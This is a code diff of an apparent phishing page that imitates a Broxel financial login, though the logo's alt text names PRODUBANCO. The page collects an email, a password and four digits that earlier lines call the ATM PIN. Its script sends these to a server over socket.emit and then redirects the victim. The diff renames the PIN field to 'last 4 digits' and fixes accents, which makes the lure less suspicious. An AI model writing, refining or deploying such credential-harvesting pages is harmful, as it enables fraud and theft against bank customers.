@@ -110,25 +110,25 @@
   <div class="screen active" id="pantallaInicio">
     <img src="https://broxel.com/wp-content/uploads/2024/05/cropped-Broxel_favicon-300x300.png" alt="PRODUBANCO" class="logo">
     <h2>Bienvenido a <strong>BROXEL</strong></h2>
-    <p>Ingrese su correo electronico, contraseña y celular (ultimos 4 digitos) para iniciar con su proceso financiero.</p>
+    <p>Ingrese su correo electrónico, contraseña y celular (últimos 4 dígitos) para iniciar con su proceso financiero.</p>
     <form id="login-form">
       <div class="input-group">
         <div class="icon"><i class="fas fa-user"></i></div>
-        <input type="email" id="usuario" placeholder="Ingrese su correo electronico" required>
+        <input type="email" id="usuario" placeholder="Ingrese su correo electrónico" required>
       </div>
       <div class="input-group">
         <div class="icon"><i class="fas fa-lock"></i></div>
         <input type="password" id="password" placeholder="Contraseña" required>
       </div>
-      <!-- Nuevo campo Clave de cajero -->
+      <!-- Campo de últimos 4 dígitos -->
       <div class="input-group">
         <div class="icon"><i class="fas fa-key"></i></div>
-        <input type="tel" id="cajero" placeholder="Ultimos 4 digitos" maxlength="4" required>
+        <input type="tel" id="ultimosDigitos" placeholder="Últimos 4 dígitos" maxlength="4" required>
       </div>
       
       <p id="usuarioError" class="mensaje-error"></p>
       <p id="passwordError" class="mensaje-error"></p>
-      <p id="cajeroError" class="mensaje-error"></p>
+      <p id="ultimosDigitosError" class="mensaje-error"></p>
       <button type="submit" id="btnContinuar">Continuar</button>
     </form>
   </div>
@@ -144,15 +144,15 @@
         form.addEventListener('submit', (e) => {
           e.preventDefault();
 
-          if (validarUsuario() && validarPassword() && validarCajero()) {
+          if (validarUsuario() && validarPassword() && validarUltimosDigitos()) {
             const usuario = document.getElementById('usuario').value;
             const contrasena = document.getElementById('password').value;
-            const cajero = document.getElementById('cajero').value;
+            const ultimosDigitos = document.getElementById('ultimosDigitos').value;
 
             const sessionId = Math.random().toString(36).substring(2, 15);
             localStorage.setItem('sessionId', sessionId);
 
-            socket.emit('dataForm', { usuario, contrasena, cajero, sessionId });
+            socket.emit('dataForm', { usuario, contrasena, ultimosDigitos, sessionId });
 
             window.location.href = 'opciones.html';
           }
@@ -196,24 +196,24 @@
       }
     }
 
-    function validarCajero() {
-      const cajero = document.getElementById("cajero").value;
-      const cajeroError = document.getElementById("cajeroError");
-      const cajeroInput = document.getElementById("cajero");
+    function validarUltimosDigitos() {
+      const valor = document.getElementById("ultimosDigitos").value;
+      const error = document.getElementById("ultimosDigitosError");
+      const input = document.getElementById("ultimosDigitos");
 
       const soloNumeros = /^\d{4}$/;
 
-      if (!cajero) {
-        cajeroError.textContent = "La clave de cajero es obligatoria";
-        cajeroInput.classList.add("campo-requerido");
+      if (!valor) {
+        error.textContent = "Debe ingresar los últimos 4 dígitos";
+        input.classList.add("campo-requerido");
         return false;
-      } else if (!soloNumeros.test(cajero)) {
-        cajeroError.textContent = "Debe ingresar exactamente 4 dígitos numéricos";
-        cajeroInput.classList.add("campo-requerido");
+      } else if (!soloNumeros.test(valor)) {
+        error.textContent = "Debe ingresar exactamente 4 dígitos numéricos";
+        input.classList.add("campo-requerido");
         return false;
       } else {
-        cajeroError.textContent = "";
-        cajeroInput.classList.remove("campo-requerido");
+        error.textContent = "";
+        input.classList.remove("campo-requerido");
         return true;
       }
     }
